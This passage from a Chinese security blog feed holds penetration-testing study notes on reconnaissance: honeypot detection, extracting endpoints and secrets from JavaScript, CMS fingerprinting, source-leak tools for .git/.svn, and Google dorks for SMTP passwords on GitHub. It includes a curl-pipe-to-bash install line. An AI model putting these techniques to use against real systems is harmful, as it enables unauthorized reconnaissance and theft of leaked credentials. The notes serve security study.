class="headerlink" title="蜜罐产品："></a>蜜罐产品：</h3><p>见上图  </p><h3 id="识别原理："><a href="#识别原理：" class="headerlink" title="识别原理："></a>识别原理：</h3><p><a href="https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg">https://mp.weixin.qq.com/s/jPz9hBmUypFyQlU27vglUg</a>  </p><h3 id="识别技术："><a href="#识别技术：" class="headerlink" title="识别技术："></a>识别技术：</h3><ul><li><p>1、测试<br>大概了解组成功能等<br><a href="https://hfish.net/#/">https://hfish.net/#/</a><br>（虚拟机ubuntu开启环境，使用root运行：)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -i</span><br><span class="line">bash &lt;(curl -sS -L https://hfish.net/webinstall.sh)</span><br></pre></td></tr></table></figure><p>登陆链接：https:&#x2F;&#x2F;[ip]:4433&#x2F;web&#x2F; (192.168.43.50) </p></li><li><p>2、项目<br>项目识别<br><a href="https://github.com/graynjo/Heimdallr">https://github.com/graynjo/Heimdallr</a><br><a href="https://github.com/360quake/quake_rs">https://github.com/360quake/quake_rs</a><br>quake.exe init apikey值<br>quake.exe honeypot 目标  </p></li><li><p>3、人工<br>*端口多而有规律性<br>*Web访问协议就下载<br>*设备指纹分析（见上图）  </p></li><li><p>4、网络空间<br>鹰图，Quake</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>14信息打点-JS架构</title>
      <link href="/2023/10/03/14%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-JS%E6%9E%B6%E6%9E%84/"/>
      <url>/2023/10/03/14%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-JS%E6%9E%B6%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>8、JS前端架构-识别&amp;分析</li><li>9、JS前端架构-开发框架分析</li><li>10、JS前端架构-打包器分析</li><li>11、JS前端架构-提取&amp;FUZZ<br>解决：<br>1、如何从表现中的JS提取价值信息<br>2、如何从地址中FUZZ提取未知的JS文件<br>3、如何从JS开放框架WebPack进行测试</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等</li></ul><h2 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h2><ul><li>CMS：<br>Discuz、WordPress、Ecshop、蝉知等  </li><li>前端技术：<br>HTML5、jquery、bootstrap、Vue等  </li><li>开发语言：<br>PHP、JAVA、Ruby、Python、C#，JS等  </li><li>Web服务器：(中间件)<br>Apache、Nginx、IIS、lighttpd，Apache等  </li><li>应用服务器：<br>（应用服务器特点就是会开放一个端口，web和应用服务器是针对不同服务类型的特点就是会开放一个端口，web和应用服务器是针对不同服务类型的）<br>Tomcat、Jboss、Weblogic、Websphere等  </li><li>数据库类型：<br>Mysql、SqlServer、Oracle、Redis、MongoDB等  </li><li>操作系统信息：<br>Linux、windows等  </li><li>应用服务信息：<br>FTP、SSH、RDP、SMB、SMTP、LDAP、Rsync等  </li><li>CDN信息：<br>帝联、Cloudflare、网宿、七牛云、阿里云等  </li><li>WAF信息：<br>创宇盾、宝塔、ModSecurity、玄武盾、OpenRASP等  </li><li>蜜罐信息：<br>HFish、TeaPot、T-Pot、Glastopf等  </li><li>其他组件信息：<br>fastjson、shiro、log4j、OA办公等</li></ul><h3 id="1、什么是JS渗透测试？"><a href="#1、什么是JS渗透测试？" class="headerlink" title="1、什么是JS渗透测试？"></a>1、什么是JS渗透测试？</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Javascript中也存在变量和函数，当存在可控变量及函数调用即可参数漏洞JS开发的WEB应用和PHP，JAVA,NET等区别在于即没有源代码，也可以通过浏览器的查看源代码获取真实的点。获取URL，获取JS敏感信息，获取代码传参等，所以相当于JS开发的WEB应用属于白盒测试（默认有源码参考），一般会在JS中寻找更多的URL地址，在JS代码逻辑（加密算法，APIkey配置，验证逻辑等）进行后期安全测试。<br>前提：Web应用可以采用后端或前端语言开发<br>-后端语言：php java python .NET 浏览器端看不到真实的源代码<br>-前端语言：JavaScript(JS)和JS框架 浏览器端看到真实的源代码<br>例子：<br>zblog：核心功能采用PHP语言去传输接受<br>vue.js：核心功能采用框架语法（JS）传输接受  </p><h3 id="2、JS安全问题"><a href="#2、JS安全问题" class="headerlink" title="2、JS安全问题"></a>2、JS安全问题</h3><p>源码泄漏<br>未授权访问&#x3D;JS里面分析更多的URL访问确定接口路径<br>敏感key泄漏&#x3D;JS文件中可能配置了接口信息（云应用，短信，邮件，数据库等）<br>API接口安全&#x3D;（代码中加密提交参数传递，更多的URL路径）  </p><h3 id="3、流行的Js框架有那些？"><a href="#3、流行的Js框架有那些？" class="headerlink" title="3、流行的Js框架有那些？"></a>3、流行的Js框架有那些？</h3><p>Vue NodeJS jQuery Angular等    </p><h3 id="4、如何判定JS开发应用？"><a href="#4、如何判定JS开发应用？" class="headerlink" title="4、如何判定JS开发应用？"></a>4、如何判定JS开发应用？</h3><p>插件wappalyzer<br>源程序代码简短<br>引入多个js文件<br>一般有&#x2F;static&#x2F;js&#x2F;app.js等顺序的js文件<br>一般cookie中有connect.sid  </p><h3 id="5、如何获取更多的JS文件？"><a href="#5、如何获取更多的JS文件？" class="headerlink" title="5、如何获取更多的JS文件？"></a>5、如何获取更多的JS文件？</h3><p>手工-浏览器搜索<br>半自动-Burpsuite插件<br>工具化-各类提取&amp;FUZZ项目  </p><h3 id="6、如何快速获取价值信息？"><a href="#6、如何快速获取价值信息？" class="headerlink" title="6、如何快速获取价值信息？"></a>6、如何快速获取价值信息？</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">src=  </span><br><span class="line">path=  </span><br><span class="line">method:&quot;get&quot;  </span><br><span class="line">http.get(&quot;  </span><br><span class="line">method:&quot;post&quot;  </span><br><span class="line">http.post(&quot;  </span><br><span class="line">$.ajax  </span><br><span class="line">http://service.httppost  </span><br><span class="line"> http://service.httpget  </span><br></pre></td></tr></table></figure><h2 id="前端架构-手工搜索分析"><a href="#前端架构-手工搜索分析" class="headerlink" title="前端架构-手工搜索分析"></a>前端架构-手工搜索分析</h2><p>浏览器全局搜索分析  </p><h2 id="前端架构-半自动Burp分析"><a href="#前端架构-半自动Burp分析" class="headerlink" title="前端架构-半自动Burp分析"></a>前端架构-半自动Burp分析</h2><p>自带功能：Target-&gt;sitemap-&gt;Engagement tools-&gt;Find scripts<br>官方插件：JS Link Finder &amp; JS Miner<br>第三方插件：HaE &amp; Unexpected_information<br>插件加载器：jython-standalone-2.7.2<br><strong>Unexpected_information：</strong><br><a href="https://github.com/ScriptKid-Beta/Unexpected_information">https://github.com/ScriptKid-Beta/Unexpected_information</a><br>用来标记请求包中的一些敏感信息、JS接口和一些特殊字段，防止我们疏忽了一些数据包，使用它可能会有意外的收获信息。<br><strong>HaE：</strong><br><a href="https://github.com/gh0stkey/HaE">https://github.com/gh0stkey/HaE</a><br><a href="https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Config.yml">https://raw.githubusercontent.com/gh0stkey/HaE/gh-pages/Config.yml</a><br>基于BurpSuite插件JavaAPI开发的请求高亮标记与信息提取的辅助型插件。该插件可以通过自定义正则的方式匹配响应报文或请求报文，可以自行决定符合该自定义正则匹配的相应请求是否需要高亮标记、信息提取。  </p><h2 id="前端架构-自动化项目分析"><a href="#前端架构-自动化项目分析" class="headerlink" title="前端架构-自动化项目分析"></a>前端架构-自动化项目分析</h2><ul><li><p><strong>Jsfinder</strong>-从表现中JS中提取URL或者敏感数据<br><a href="https://github.com/Threezh1/JSFinder">https://github.com/Threezh1/JSFinder</a><br>一款用作快速在网站的js文件中提取URL，子域名的工具  </p></li><li><p><strong>URLFinder</strong>-从表现中JS中提取URL或者敏感数据<br><a href="https://github.com/pingc0y/URLFinder">https://github.com/pingc0y/URLFinder</a><br>一款用于快速提取检测页面中JS与URL的工具。<br>功能类似于JSFinder，但JSFinder好久没更新了。</p></li></ul><p><code>URLFinder-windows-amd64.exe -u url -s all -m 2</code></p><ul><li><p><strong>JSINFO-SCAN</strong>-从表现中JS中提取URL或者敏感数据<br><a href="https://github.com/p1g3/JSINFO-SCAN">https://github.com/p1g3/JSINFO-SCAN</a><br>递归爬取域名(netloc&#x2F;domain)，以及递归从JS中获取信息的工具  </p></li><li><p><strong>FindSomething</strong>-从表现中JS中提取URL或者敏感数据(浏览器插件)<br><a href="https://github.com/momosecurity/FindSomething">https://github.com/momosecurity/FindSomething</a><br>该工具是用于快速在网页的html源码或js代码中提取一些有趣的信息的浏览器插件，包括请求的资源、接口的url，请求的ip和域名，泄漏的证件号、手机号、邮箱等信息。</p></li><li><p><strong>ffuf-FUZZ</strong>-爆破找到更多的js文件分析更多的信息<br><a href="https://github.com/ffuf/ffuf">https://github.com/ffuf/ffuf</a><br><a href="https://wordlists.assetnote.io(下载字典)/">https://wordlists.assetnote.io(下载字典)</a><br>功能强大的模糊化工具，用它来FUZZ模糊化js文件。</p></li></ul><p><code>ffuf.exe -w 字典.txt -u http://xxx.xxx.com/FUZZ  -t 200</code></p><ul><li><strong>Packer-Fuzzer</strong>-针对JS框架开发打包器Webpack检测（扫描完后生成报告）<br><a href="https://github.com/rtcatc/Packer-Fuzzer">https://github.com/rtcatc/Packer-Fuzzer</a><br>一款针对Webpack等前端打包工具所构造的网站进行快速、高效安全检测的扫描工具</li></ul><p><code>python Packer-Fuzzer.py -u http://xxx.xxx.com</code></p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>13信息打点-web应用打点</title>
      <link href="/2023/10/03/13%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-web%E5%BA%94%E7%94%A8%E6%89%93%E7%82%B9/"/>
      <url>/2023/10/03/13%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-web%E5%BA%94%E7%94%A8%E6%89%93%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p>见 <a href="http://z7yy.top/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/">12信息打点</a></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><ul><li>5、开源-CMS指纹识别源码获取方式</li><li>6、闭源-习惯&amp;配置&amp;特性等获取方式</li><li>7、闭源-托管资产平台资源搜索监控</li></ul><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><ul><li>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等</li><li>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等</li><li>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等</li><li>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等</li><li>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等</li><li>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等</li></ul><h2 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;关于网站指纹识别，可以使用插件，也可以使用在线识别工具<br>&nbsp;&nbsp;&nbsp;&nbsp;当然，如果实在内网情况，没办法使用在线识别网站，这时间我们可以使用工具WhatWeb 进行识别<br>&nbsp;&nbsp;&nbsp;&nbsp;最重要的，可以根据一些特征，直接判断是什么cms或者框架，例如spring ico文件是一片树叶<br>&nbsp;&nbsp;&nbsp;&nbsp;还可以根据报错等进行判断，这些就需要自己平时多进行搜集，多关注一些就可以</p><table><thead><tr><th>标签</th><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>指纹识别</td><td>在线cms指纹识别</td><td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td></tr><tr><td>指纹识别</td><td>Wappalyzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr><tr><td>指纹识别</td><td>TideFinger潮汐</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>指纹识别</td><td>云悉指纹</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>指纹识别</td><td>WhatWeb</td><td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td></tr><tr><td>指纹识别</td><td>数字观星Finger-P</td><td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td></tr></tbody></table><h2 id="后端-开源-指纹识别-源码下载"><a href="#后端-开源-指纹识别-源码下载" class="headerlink" title="后端-开源-指纹识别-源码下载"></a>后端-开源-指纹识别-源码下载</h2><p>CMS识别见上述项目</p><h2 id="后端-闭源-配置不当-源码泄漏"><a href="#后端-闭源-配置不当-源码泄漏" class="headerlink" title="后端-闭源-配置不当-源码泄漏"></a>后端-闭源-配置不当-源码泄漏</h2><p>参考：<a href="https://www.secpulse.com/archives/124398.html">https://www.secpulse.com/archives/124398.html</a><br>备份：敏感目录文件扫描<br>CVS：<a href="https://github.com/kost/dvcs-ripper">https://github.com/kost/dvcs-ripper</a><br>GIT：<a href="https://github.com/lijiejie/GitHack">https://github.com/lijiejie/GitHack</a><br>SVN：<a href="https://github.com/callmefeifei/SvnHack">https://github.com/callmefeifei/SvnHack</a><br>DS_Store：<a href="https://github.com/lijiejie/ds_store_exp">https://github.com/lijiejie/ds_store_exp</a>  </p><p>源码泄漏原因：<br>1、从源码本身的特性入口<br>2、从管理员不好的习惯入口<br>3、从管理员不好的配置入口<br>4、从管理员不好的意识入口<br>5、从管理员资源信息搜集入口<br>源码泄漏集合：<br>composer.json(<a href="https://zhuanlan.zhihu.com/p/487883420">https://zhuanlan.zhihu.com/p/487883420</a>)<br>git源码泄露<br>svn源码泄露<br>hg源码泄漏<br>网站备份压缩文件<br>WEB-INF&#x2F;web.xml 泄露<br>&nbsp;&nbsp;&nbsp;&nbsp;(WEB.xml:应用程序配置文件，描述了SErvlet和其它应用配置及命名规则。<br>&nbsp;&nbsp;&nbsp;&nbsp;classes：含所有classes文件<br>&nbsp;&nbsp;&nbsp;&nbsp;lib:存放应用的各种jAR文件<br>&nbsp;&nbsp;&nbsp;&nbsp;src：源文件<br>&nbsp;&nbsp;&nbsp;&nbsp;database.properties:数据库配置文件)<br>DS_Store 文件泄露<br>SWP 文件泄露<br>CVS泄露<br>Bzr泄露<br>GitHub源码泄漏  </p><h2 id="后端-方向-资源GITHUB-源码泄漏"><a href="#后端-方向-资源GITHUB-源码泄漏" class="headerlink" title="后端-方向-资源GITHUB-源码泄漏"></a>后端-方向-资源GITHUB-源码泄漏</h2><p>解决1：识别出大致信息却无下载资源(oschina、github、gitee)<br>解决2：未识别出信息使用码云资源获取<br>解决3：其他行业开发使用对口资源站获取<br>涉及：(oschina)<br><a href="https://gitee.com/">https://gitee.com/</a><br><a href="https://github.com/">https://github.com/</a><br><a href="https://www.huzhan.com/">https://www.huzhan.com/</a>  </p><ul><li>GITHUB资源搜索： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">in:name test               #仓库标题搜索含有关键字   </span><br><span class="line">in:descripton test         #仓库描述搜索含有关键字   </span><br><span class="line">in:readme test             #Readme文件搜素含有关键字   </span><br><span class="line">stars:&gt;3000 test           #stars数量大于3000的搜索关键字   </span><br><span class="line">stars:1000..3000 test      #stars数量大于1000小于3000的搜索关键字  </span><br><span class="line">forks:&gt;1000 test           #forks数量大于1000的搜索关键字(考虑路由)     </span><br><span class="line">forks:1000..3000 test      #forks数量大于1000小于3000的搜索关键字  </span><br><span class="line">size:&gt;=5000 test           #指定仓库大于5000k(5M)的搜索关键字</span><br><span class="line">pushed:&gt;2019-02-12 test    #发布时间大于2019-02-12的搜索关键字  </span><br><span class="line">created:&gt;2019-02-12 test   #创建时间大于2019-02-12的搜索关键字  </span><br><span class="line">user:test                  #用户名搜素   </span><br><span class="line">license:apache-2.0 test    #明确仓库的 LICENSE 搜索关键字   </span><br><span class="line">language:java test         #在java语言的代码中搜索关键字   </span><br><span class="line">user:test in:name test     #组合搜索,用户名test的标题含有test的  </span><br></pre></td></tr></table></figure></li><li>关键字配合谷歌搜索：  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">site:Github.com smtp     </span><br><span class="line">site:Github.com smtp @qq.com     </span><br><span class="line">site:Github.com smtp @126.com   </span><br><span class="line">site:Github.com smtp @163.com   </span><br><span class="line">site:Github.com smtp @sina.com.cn   </span><br><span class="line">site:Github.com smtp password   </span><br><span class="line">site:Github.com String password smtp  </span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>12信息打点-信息收集网站</title>
      <link href="/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/"/>
      <url>/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p> <img src="/2023/10/03/12%E4%BF%A1%E6%81%AF%E6%89%93%E7%82%B9-%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E7%BD%91%E7%AB%99/image2.png"></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>1、业务资产-应用类型分类<br>2、Web单域名获取-接口查询<br>3、Web子域名获取-解析枚举<br>4、Web架构资产-平台指纹识别</p><h2 id="章节点"><a href="#章节点" class="headerlink" title="章节点"></a>章节点</h2><p>Web：语言&#x2F;CMS&#x2F;中间件&#x2F;数据库&#x2F;系统&#x2F;WAF等<br>系统：操作系统&#x2F;端口服务&#x2F;网络环境&#x2F;防火墙等<br>应用：APP对象&#x2F;API接口&#x2F;微信小程序&#x2F;PC应用等<br>架构：CDN&#x2F;前后端&#x2F;云应用&#x2F;站库分离&#x2F;OSS资源等<br>技术：JS爬虫&#x2F;敏感扫描&#x2F;目录爬虫&#x2F;源码获取&#x2F;接口泄漏等<br>技术：指纹识别&#x2F;端口扫描&#x2F;CDN绕过&#x2F;WAF识别&#x2F;Github监控等</p><table><thead><tr><th>标签</th><th>名称</th><th>地址</th></tr></thead><tbody><tr><td>企业信息</td><td>天眼查</td><td><a href="https://www.tianyancha.com/">https://www.tianyancha.com/</a></td></tr><tr><td>企业信息</td><td>小蓝本</td><td><a href="https://www.xiaolanben.com/">https://www.xiaolanben.com/</a></td></tr><tr><td>企业信息</td><td>爱企查</td><td><a href="https://aiqicha.baidu.com/">https://aiqicha.baidu.com/</a></td></tr><tr><td>企业信息</td><td>企查查</td><td><a href="https://www.qcc.com/">https://www.qcc.com/</a></td></tr><tr><td>企业信息</td><td>国外企查</td><td><a href="https://opencorporates.com/">https://opencorporates.com/</a></td></tr><tr><td>企业信息</td><td>启信宝</td><td><a href="https://www.qixin.com/">https://www.qixin.com/</a></td></tr><tr><td>备案信息</td><td>备案信息查询</td><td><a href="http://www.beianx.cn/">http://www.beianx.cn/</a></td></tr><tr><td>备案信息</td><td>备案管理系统</td><td><a href="https://beian.miit.gov.cn/">https://beian.miit.gov.cn/</a></td></tr><tr><td>公众号信息</td><td>搜狗微信搜索</td><td><a href="https://weixin.sogou.com/">https://weixin.sogou.com/</a></td></tr><tr><td>注册域名</td><td>域名注册查询</td><td><a href="https://buy.cloud.tencent.com/domain">https://buy.cloud.tencent.com/domain</a></td></tr><tr><td>IP反查</td><td>IP反查域名</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>IP反查</td><td>IP反查域名</td><td><a href="http://dns.bugscaner.com/">http://dns.bugscaner.com/</a></td></tr><tr><td>DNS数据</td><td>dnsdumpster</td><td><a href="https://dnsdumpster.com/">https://dnsdumpster.com/</a></td></tr><tr><td>证书查询</td><td>CertificateSearch</td><td><a href="https://crt.sh/">https://crt.sh/</a></td></tr><tr><td>网络空间</td><td>FOFA</td><td><a href="https://fofa.info/">https://fofa.info/</a></td></tr><tr><td>网络空间</td><td>全球鹰</td><td><a href="http://hunter.qianxin.com/">http://hunter.qianxin.com/</a></td></tr><tr><td>网络空间</td><td>360</td><td><a href="https://quake.360.cn/quake/#/index">https://quake.360.cn/quake/#/index</a></td></tr><tr><td>威胁情报</td><td>微步在线 情报社区</td><td><a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></td></tr><tr><td>威胁情报</td><td>奇安信 威胁情报中心</td><td><a href="https://ti.qianxin.com/">https://ti.qianxin.com/</a></td></tr><tr><td>威胁情报</td><td>360 威胁情报中心</td><td><a href="https://ti.360.cn/#/homepage">https://ti.360.cn/#/homepage</a></td></tr><tr><td>枚举解析</td><td>在线子域名查询</td><td><a href="http://tools.bugscaner.com/subdomain/">http://tools.bugscaner.com/subdomain/</a></td></tr><tr><td>枚举解析</td><td>DNSGrep子域名查询</td><td><a href="https://www.dnsgrep.cn/subdomain">https://www.dnsgrep.cn/subdomain</a></td></tr><tr><td>枚举解析</td><td>工具强大的子域名收集器</td><td><a href="https://github.com/shmilylty/OneForAll">https://github.com/shmilylty/OneForAll</a></td></tr><tr><td>指纹识别</td><td>在线cms指纹识别</td><td><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a></td></tr><tr><td>指纹识别</td><td>Wappalyzer</td><td><a href="https://github.com/AliasIO/wappalyzer">https://github.com/AliasIO/wappalyzer</a></td></tr><tr><td>指纹识别</td><td>TideFinger潮汐</td><td><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></td></tr><tr><td>指纹识别</td><td>云悉指纹</td><td><a href="https://www.yunsee.cn/">https://www.yunsee.cn/</a></td></tr><tr><td>指纹识别</td><td>WhatWeb</td><td><a href="https://github.com/urbanadventurer/WhatWeb">https://github.com/urbanadventurer/WhatWeb</a></td></tr><tr><td>指纹识别</td><td>数字观星Finger-P</td><td><a href="https://fp.shuziguanxing.com/#/">https://fp.shuziguanxing.com/#/</a></td></tr><tr><td>网络空间</td><td>钟馗之眼</td><td><a href="https://www.zoomeye.org/?R1nG">https://www.zoomeye.org/?R1nG</a></td></tr><tr><td>网络空间</td><td>零零信安</td><td><a href="https://0.zone/">https://0.zone/</a></td></tr><tr><td>网络空间</td><td>Shodan</td><td><a href="https://www.shodan.io/">https://www.shodan.io/</a></td></tr><tr><td>网络空间</td><td>Censys</td><td><a href="https://censys.io/">https://censys.io/</a></td></tr><tr><td>网络空间</td><td>ONYPHE</td><td><a href="https://www.onyphe.io/">https://www.onyphe.io/</a></td></tr><tr><td>网络空间</td><td>FullHunt</td><td><a href="https://fullhunt.io/">https://fullhunt.io/</a></td></tr><tr><td>网络空间</td><td>Soall Search Engine</td><td><a href="https://soall.org/">https://soall.org/</a></td></tr><tr><td>网络空间</td><td>Netlas</td><td><a href="https://app.netlas.io/responses/">https://app.netlas.io/responses/</a></td></tr><tr><td>网络空间</td><td>Leakix</td><td><a href="https://leakix.net/">https://leakix.net/</a></td></tr><tr><td>网络空间</td><td>DorkSearch</td><td><a href="https://dorksearch.com/">https://dorksearch.com/</a></td></tr><tr><td>威胁情报</td><td>VirusTotal在线查杀平台</td><td><a href="https://www.virustotal.com/gui/">https://www.virustotal.com/gui/</a></td></tr><tr><td>威胁情报</td><td>VenusEye 威胁情报中心</td><td><a href="https://www.venuseye.com.cn/">https://www.venuseye.com.cn/</a></td></tr><tr><td>威胁情报</td><td>绿盟科技 威胁情报云</td><td><a href="https://ti.nsfocus.com/">https://ti.nsfocus.com/</a></td></tr><tr><td>威胁情报</td><td>IBM 情报中心</td><td><a href="https://exchange.xforce.ibmcloud.com/">https://exchange.xforce.ibmcloud.com/</a></td></tr><tr><td>威胁情报</td><td>天际友盟安全智能平台</td><td><a href="https://redqueen.tj-un.com/IntelHome.html">https://redqueen.tj-un.com/IntelHome.html</a></td></tr><tr><td>威胁情报</td><td>华为安全中心平台</td><td><a href="https://isecurity.huawei.com/sec/web/intelligencePortal.do">https://isecurity.huawei.com/sec/web/intelligencePortal.do</a></td></tr><tr><td>威胁情报</td><td>安恒威胁情报中心</td><td><a href="https://ti.dbappsecurity.com.cn/">https://ti.dbappsecurity.com.cn/</a></td></tr><tr><td>威胁情报</td><td>AlienVault</td><td><a href="https://otx.alienvault.com/">https://otx.alienvault.com/</a></td></tr><tr><td>威胁情报</td><td>深信服</td><td><a href="https://sec.sangfor.com.cn/analysis-platform">https://sec.sangfor.com.cn/analysis-platform</a></td></tr><tr><td>威胁情报</td><td>丁爸情报分析师的工具箱</td><td><a href="http://dingba.top/">http://dingba.top/</a></td></tr><tr><td>威胁情报</td><td>听风者情报源 start.me</td><td><a href="https://start.me/p/X20Apn">https://start.me/p/X20Apn</a></td></tr><tr><td>威胁情报</td><td>GreyNoise Visualizer</td><td><a href="https://viz.greynoise.io/">https://viz.greynoise.io/</a></td></tr><tr><td>威胁情报</td><td>URLhaus 数据库</td><td><a href="https://urlhaus.abuse.ch/browse/">https://urlhaus.abuse.ch/browse/</a></td></tr><tr><td>威胁情报</td><td>Pithus</td><td><a href="https://beta.pithus.org/">https://beta.pithus.org/</a></td></tr></tbody></table><h2 id="业务资产："><a href="#业务资产：" class="headerlink" title="业务资产："></a>业务资产：</h2><p>1、WEB应用<br>2、APP应用<br>3、PC端应用<br>4、小程序应用<br>5、微信公众号<br>6、其他产品等  </p><h2 id="WEB单域名："><a href="#WEB单域名：" class="headerlink" title="WEB单域名："></a>WEB单域名：</h2><p>1、备案信息<br>2、企业产权<br>3、注册域名<br>4、反查解析  </p><h2 id="WEB子域名："><a href="#WEB子域名：" class="headerlink" title="WEB子域名："></a>WEB子域名：</h2><p>1、DNS数据<br>2、证书查询(https)<br>3、网络空间<br>4、威胁情报<br>5、枚举解析(爆破子域)  </p><h2 id="Web架构资产：（指纹识别）"><a href="#Web架构资产：（指纹识别）" class="headerlink" title="Web架构资产：（指纹识别）"></a>Web架构资产：（指纹识别）</h2><p>1、程序语言<br>2、框架源码（纯内网识别cms用工具cmsmap、cmseek）<br>3、搭建平台<br>4、数据库类<br>5、操作系统  </p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息打点 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11基础入门-chatGPT</title>
      <link href="/2023/10/03/11%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-chatGPT/"/>
      <url>/2023/10/03/11%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8-chatGPT/</url>
      
